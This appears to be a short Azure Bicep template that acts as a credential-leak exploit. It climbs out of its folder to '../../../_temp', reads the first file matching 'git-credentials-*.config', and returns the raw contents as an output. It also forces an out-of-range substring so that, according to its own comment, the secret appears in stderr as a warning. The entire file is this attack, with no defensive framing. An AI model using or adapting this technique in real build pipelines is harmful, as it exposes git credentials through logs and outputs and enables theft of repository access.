var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.config')
var raw = loadTextContent(credFiles[0].relativePath)

// This will show in stderr as a warning with the value
#disable-next-line no-unused-vars
var forceWarning = substring(raw, 999, 1)

output content string = raw
